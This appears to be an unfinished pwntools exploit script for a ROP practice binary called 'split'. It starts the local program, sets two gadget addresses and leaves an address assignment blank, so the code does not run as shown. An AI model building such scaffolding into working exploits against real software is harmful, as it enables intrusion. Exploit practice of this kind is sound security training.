from pwn import *

r = process("./split")

pop_rdi = 0x00000000004007c3
pop_rsi = 0x00000000004007c1
addr = 

r.interactive()